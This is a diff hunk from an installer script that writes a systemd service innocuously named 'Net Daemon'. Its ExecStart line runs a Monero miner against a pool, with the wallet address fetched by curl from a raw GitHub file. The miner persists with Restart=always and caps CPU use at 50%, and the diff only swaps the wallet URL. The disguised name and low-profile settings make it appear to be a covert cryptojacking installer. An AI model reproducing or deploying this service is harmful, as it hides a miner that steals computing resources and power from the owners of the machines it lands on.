@@ -48,7 +48,7 @@ Description=Net Daemon
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME1 -o $POOL -u \$(curl -s https://raw.githubusercontent.com/DucManh206/rawtext/main/wallet.txt).$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU1 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG1
+ExecStart=$INSTALL_DIR/$NAME1 -o $POOL -u \$(curl -s https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt).$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU1 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG1
 Restart=always
 Nice=10
 
